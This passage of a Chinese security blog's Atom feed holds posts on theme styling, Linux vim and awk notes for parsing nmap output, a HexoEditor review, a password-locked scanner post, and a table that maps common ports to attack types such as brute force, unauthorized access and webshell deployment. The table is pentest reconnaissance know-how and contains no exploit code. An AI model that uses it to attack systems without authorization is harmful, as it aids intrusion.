class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">import</span> <span class="string">"my-post-copyright"</span></span><br></pre></td></tr></table></figure></p><p>保存重新生成即可。<br>如果要在该博文下面增加版权信息的显示，需要在 Markdown 中增加copyright: true的设置<br>如果你觉得每次都要输入copyright: true很麻烦的话,那么在/scaffolds/post.md文件中添加</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;主页文章添加阴影效果&quot;&gt;&lt;a href=&quot;#主页文章添加阴影效果&quot; class=&quot;headerlink&quot; title=&quot;主页文章添加阴影效果&quot;&gt;&lt;/a&gt;主页文章添加阴影效果&lt;/h3&gt;&lt;p&gt;效果图：&lt;br&gt;&lt;img src=&quot;http://picture.manhao6.cn/20190220135756363/20190220032000951.png&quot; alt&gt;&lt;br&gt;
    
    </summary>
    
      <category term="0x05 生活杂项" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/"/>
    
      <category term="主题美化" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"/>
    
    
      <category term="美化" scheme="blog.manhao6.cn/tags/%E7%BE%8E%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>linux笔记和安全加固配置（持续更新）</title>
    <link href="blog.manhao6.cn/2019/02/08/linux%E7%AC%94%E8%AE%B0%E5%92%8C%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E9%85%8D%E7%BD%AE%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>blog.manhao6.cn/2019/02/08/linux笔记和安全加固配置（持续更新）/</id>
    <published>2019-02-08T14:49:05.000Z</published>
    <updated>2019-04-15T09:05:05.669Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言："><a href="#0x01-前言：" class="headerlink" title="0x01 前言："></a>0x01 前言：</h1><p>   最近在找工作，由于去年参加考研。一心放在考研上，工作没找。后来考研成绩出来了，自己成绩不理想，只能乖乖的找工作。以前没时间总结，做了一些零碎的记录，趁着找工作吧之前记录给总结下，下面是自己总结linux-持续更新。<br><a id="more"></a></p><h1 id="0x02-linux基础篇"><a href="#0x02-linux基础篇" class="headerlink" title="0x02 linux基础篇"></a>0x02 linux基础篇</h1><p>基础的知识(ls,pwd,mkdir,cd ,netstat等)在安全的时候学过了这里就不多记载了。</p><h2 id="inux高效文本、文件处理命令"><a href="#inux高效文本、文件处理命令" class="headerlink" title="inux高效文本、文件处理命令"></a>inux高效文本、文件处理命令</h2><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>基本上 vi/vim 共分为三种模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）</p><ul><li>命令模式:<ul><li>i 切换到输入模式，以输入字符。</li><li>x 删除当前光标所在处的字符。</li><li>: 切换到底线命令模式，以在最底一行输入命令</li></ul></li><li>输入模式<br>在命令模式下按下i就进入了输入模式</li><li>底线命令模式<br>在命令模式下按下:（英文冒号）就进入了底线命令模式。<br>q 退出程序<br>w 保存文件</li><li>常用的命令（自己不熟悉，但很常用的命令）<blockquote><p>G:–&gt;移动到这个档案的最后一行(常用) :shift + g<br>nG : —&gt;移动到这个档案的第 n 行<br>gg :移动到这个档案的第一行<br>/word 光标下搜索word单词所在行<br>？word 光标上搜索</p><ul><li>:n1,n2s /word1/word2/g    n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2 ！</li><li>:1,$s/word1/word2/g 或 :%s/word1/word2/g    从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！(常用)</li><li>:1,$s/word1/word2/gc 或 :%s/word1/word2/gc    从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用) </li></ul></blockquote></li></ul><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk是一种编程语言，用于在linux/unix下对文本和数据进行处理,是行处理器,一次对每一行进行处理，然后输出。<br>详细资料<a href="https://www.cnblogs.com/emanlee/p/3327576.htm" target="_blank" rel="noopener">—&gt;文档</a><br>本文演示是提取nmap输出文件如下,我们或一步步提取出格式化输出ip|port|state| service|<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> localhost (127.0.0.1)</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: 994 closed ports</span><br><span class="line">PORT     STATE<span class="built_in"> SERVICE </span>         VERSION</span><br><span class="line">80/tcp   open  http             Apache httpd 2.4.34 ((Unix) PHP/7.1.23)</span><br><span class="line">88/tcp   open  tcpwrapped</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">1086/tcp open  cplscrambler-lg?</span><br><span class="line">1087/tcp open  cplscrambler-in?</span><br><span class="line">1089/tcp open  tcpwrapped</span><br></pre></td></tr></table></figure></p><p>[options]<br>  -F : 指明输入时用到的字段分隔符<br>  -v var=VALUE : 自定义变量<br>  -f 加载awk脚本<br>awk输出：</p><ul><li>字符串匹配<blockquote><p>awk ‘/open/‘ nmap.txt<br>我们要提取出端口开放的行，输出有open行的字符,<br><img src="http://picture.manhao6.cn/linux笔记和安全加固配置（持续更新）/20190401043133510.png" alt></p></blockquote></li><li><p>折分文件</p><blockquote><p>$0代表当前行 $1-n表示列 $NF表示最后字段<br><img src="http://picture.manhao6.cn/linux笔记和安全加固配置（持续更新）/20190401044543531.png" alt><br><img src="http://picture.manhao6.cn/linux笔记和安全加固配置（持续更新）/20190401045226416.png" alt><br>现在我们需要提取ip 如ip会显示在第一行。如127.0.0.1<br><img src="http://picture.manhao6.cn/linux笔记和安全加固配置（持续更新）/20190401064529684.png" alt><br>现在我们和并ip 和开放端口</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@zm ~]# awk '/Nmap scan <span class="keyword">report</span>/ &#123; <span class="keyword">if</span>(<span class="built_in">match</span>(<span class="variable">$5</span>,<span class="string">"[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;"</span>))&#123;ip=<span class="variable">$5&#125;</span><span class="keyword">else</span>&#123;ip=gensub(/\(|\)/,<span class="string">""</span>,1,gensub(/\(|\)/,<span class="string">""</span>,1,<span class="variable">$6</span>))&#125;&#125; /<span class="keyword">open</span>/&#123;<span class="keyword">split</span>(<span class="variable">$1</span>, t, <span class="string">"/"</span>);port=t[1];<span class="keyword">type</span>=t[2];<span class="variable">$1</span>=ip<span class="string">"\t"</span>port<span class="string">"\t"</span><span class="keyword">type</span><span class="string">"\t"</span>;<span class="variable">$2</span>=<span class="string">""</span>;<span class="variable">$4</span>=<span class="variable">$4</span>==<span class="string">""</span>?<span class="string">"unknown"</span>:<span class="variable">$4</span>;<span class="variable">$4</span>=<span class="variable">$3</span><span class="string">""</span><span class="variable">$4</span>;<span class="keyword">print</span> <span class="variable">$1</span>,<span class="variable">$2</span>,<span class="variable">$3</span>,<span class="variable">$4&#125;</span>' nmap.txt</span><br></pre></td></tr></table></figure></blockquote><p><img src="http://picture.manhao6.cn/linux笔记和安全加固配置（持续更新）/20190401070255875.png" alt></p></li></ul><h2 id="shell脚本入门"><a href="#shell脚本入门" class="headerlink" title="shell脚本入门"></a>shell脚本入门</h2><p>》》》 待更新</p><h2 id="linux安全加固"><a href="#linux安全加固" class="headerlink" title="linux安全加固"></a>linux安全加固</h2><h2 id="window安全加固"><a href="#window安全加固" class="headerlink" title="window安全加固"></a>window安全加固</h2>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-前言：&quot;&gt;&lt;a href=&quot;#0x01-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言：&quot;&gt;&lt;/a&gt;0x01 前言：&lt;/h1&gt;&lt;p&gt;   最近在找工作，由于去年参加考研。一心放在考研上，工作没找。后来考研成绩出来了，自己成绩不理想，只能乖乖的找工作。以前没时间总结，做了一些零碎的记录，趁着找工作吧之前记录给总结下，下面是自己总结linux-持续更新。&lt;br&gt;
    
    </summary>
    
      <category term="0x03 操作系统" scheme="blog.manhao6.cn/categories/0x03-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="linux" scheme="blog.manhao6.cn/categories/0x03-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/linux/"/>
    
    
      <category term="linux" scheme="blog.manhao6.cn/tags/linux/"/>
    
      <category term="笔记" scheme="blog.manhao6.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>hexoeditor强大的hexo博客工具</title>
    <link href="blog.manhao6.cn/2019/02/07/hexoeditor%E5%BC%BA%E5%A4%A7%E7%9A%84hexo%E5%8D%9A%E5%AE%A2%E5%B7%A5%E5%85%B7/"/>
    <id>blog.manhao6.cn/2019/02/07/hexoeditor强大的hexo博客工具/</id>
    <published>2019-02-07T05:06:45.000Z</published>
    <updated>2019-04-15T09:13:21.597Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://picture.manhao6.cn/hexoeditor强大的hexo博客工具/20190220051655861.png" alt><br> HexoEditor是由zhuzhuyule继承<a href="https://github.com/Moeditor/Moeditor" target="_blank" rel="noopener">Moeditor</a>进而开发的hexoeditor，支持hexo部署，七牛，腾讯云一键上传图片，对于国内用户非常方便。<br>项目地址:<a href="https://github.com/zhuzhuyule/HexoEditor" target="_blank" rel="noopener">Github</a><br><a id="more"></a></p><h2 id="HexoEditor"><a href="#HexoEditor" class="headerlink" title="HexoEditor"></a>HexoEditor</h2><p>使用Hexo _config.yml支持</p><ul><li>hexo源中的快速新帖子</li><li>快速修改文件名（在Hexo Post Edit中）</li><li>快速部署帖子</li><li>快速HEXO命令hexo d，hexo g，hexo s，hexo clean<br><img src="http://picture.manhao6.cn/hexoeditor强大的hexo博客工具/20190220052123366.png" alt><br>支持图片国内网站直接快速上传：</li><li>自动将图像更改为Markdown</li><li>支持拖动图像</li><li>支持粘贴剪贴板图像</li><li>支持图像云（一步上传）</li><li>支持SM.MS</li><li>支持齐牛 腾讯 GitHub<br><img src="http://picture.manhao6.cn/hexoeditor强大的hexo博客工具/20190220052356594.png" alt><br>额外扩展：</li><li>TeX数学表达式</li><li>UML图</li><li>编辑中的代码突出显示</li><li>读/写/预览模式</li><li>自定义字体/行高/字体大小</li><li>自定义主题</li><li>代码突出显示主题（由highlight.js提供支持）<br><img src="http://picture.manhao6.cn/hexoeditor%E5%BC%BA%E5%A4%A7%E7%9A%84hexo%E5%8D%9A%E5%AE%A2%E5%B7%A5%E5%85%B7/20190220052553579.png" alt><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示!"></a>效果展示!</h2></li></ul><p><img src="http://picture.manhao6.cn/hexoeditor%E5%BC%BA%E5%A4%A7%E7%9A%84hexo%E5%8D%9A%E5%AE%A2%E5%B7%A5%E5%85%B7/20190220052646217.png" alt><br><img src="http://picture.manhao6.cn/gif-tag.gif" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://picture.manhao6.cn/hexoeditor强大的hexo博客工具/20190220051655861.png&quot; alt&gt;&lt;br&gt; HexoEditor是由zhuzhuyule继承&lt;a href=&quot;https://github.com/Moeditor/Moeditor&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Moeditor&lt;/a&gt;进而开发的hexoeditor，支持hexo部署，七牛，腾讯云一键上传图片，对于国内用户非常方便。&lt;br&gt;项目地址:&lt;a href=&quot;https://github.com/zhuzhuyule/HexoEditor&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Github&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="0x05 生活杂项" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/"/>
    
      <category term="软件安装" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"/>
    
    
      <category term="hexo" scheme="blog.manhao6.cn/tags/hexo/"/>
    
      <category term="tools" scheme="blog.manhao6.cn/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>端口常见漏洞(持续更新)</title>
    <link href="blog.manhao6.cn/2019/01/21/%E7%AB%AF%E5%8F%A3%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    <id>blog.manhao6.cn/2019/01/21/端口常见漏洞/</id>
    <published>2019-01-21T11:10:04.000Z</published>
    <updated>2019-04-15T09:13:34.072Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端口介绍"><a href="#端口介绍" class="headerlink" title="端口介绍"></a>端口介绍</h2><p><img src="http://picture.manhao6.cn/端口常见漏洞/20190221073306662.png" alt><br>逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535<br>1.公认端口：0-1023，他们紧密绑定了一些服务，端口的通讯明确表明了某种服务的协议，许多服务绑定于这些端口，这些端口同样用于许多其它目的；<br>2.注册端口：1024-49151，他们松散的绑定了一些服务；<br>3.动态/私有：49152-65535，不为服务分配这些端口；<br><a id="more"></a><br>一些端口常常会被黑客利用，还会被一些木马病毒利用，对计算机系统进行攻击，很多木马工具也有特定的端口。</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>   在给某公司做渗透测试时，该公司主要依靠阿里云服务器，依靠阿里云顿，很多测试工具进行渗透扫描漏洞时，会被及时封ip。很多时候不得不自己写脚本来测试是否存在漏洞，或者已知版本漏洞是否可以利用。单遇到端口这块时，该公司用的是阿里云服务器，生产网服务器都对应有外部ip，生产网很多项目需要开放大量端口同步。这就造成了一个ip可能开放了将近20-30端口。很多端口服务对应已知漏洞，需要每次自己都要去查，慢慢的就积累下了很多端口对应漏洞。也会在以后的遇到新漏洞，持续更新到本文章.</p><h2 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h2><p>通常我们在进行端口渗透时，通常关注：</p><ul><li>端口的banner信息</li><li>端口上运行的服务</li><li>端口运行服务存在已知的漏洞</li></ul><table><thead><tr><th>端口</th><th>服务</th><th>存在漏洞</th></tr></thead><tbody><tr><td>21/22/69</td><td>ftp/tftp：文件传输协议</td><td>爆破 <br>嗅探<br>溢出；后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破<br>OpenSSH<br>28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破<br>嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS区域传输<br>DNS劫持<br>DNS缓存投毒<br>DNS欺骗</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持,欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破<br>未授权访问<br>远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击<br>未授权访问</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令<br>信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录,注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS<br>注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破<br>拒绝服务<br>注入</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令 <br>认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2</td><td>爆破<br>注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出<br>注入攻击<br>爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务<br>代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令<br>认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问,爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic</td><td>Java反序列化<br>控制台弱口令<br>控制台部署webshell</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击<br>对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere控制台</td><td>爆破：控制台弱口令,java反序列</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破<br>未授权访问</td></tr></tbody></table><p>上述表格转自【作者: Hurricane Security】<a href="http://www.91ri.org/15441.html" target="_blank" rel="noopener">Hurricane Security</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;端口介绍&quot;&gt;&lt;a href=&quot;#端口介绍&quot; class=&quot;headerlink&quot; title=&quot;端口介绍&quot;&gt;&lt;/a&gt;端口介绍&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://picture.manhao6.cn/端口常见漏洞/20190221073306662.png&quot; alt&gt;&lt;br&gt;逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535&lt;br&gt;1.公认端口：0-1023，他们紧密绑定了一些服务，端口的通讯明确表明了某种服务的协议，许多服务绑定于这些端口，这些端口同样用于许多其它目的；&lt;br&gt;2.注册端口：1024-49151，他们松散的绑定了一些服务；&lt;br&gt;3.动态/私有：49152-65535，不为服务分配这些端口；&lt;br&gt;
    
    </summary>
    
      <category term="0x01 技术原理" scheme="blog.manhao6.cn/categories/0x01-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/"/>
    
      <category term="主机安全" scheme="blog.manhao6.cn/categories/0x01-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="端口" scheme="blog.manhao6.cn/tags/%E7%AB%AF%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>编写python-nmap多线程扫描器</title>
    <link href="blog.manhao6.cn/2019/01/10/python-nmap%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <id>blog.manhao6.cn/2019/01/10/python-nmap多线程扫描器/</id>
    <published>2019-01-10T04:02:45.000Z</published>
    <updated>2019-04-15T09:07:47.542Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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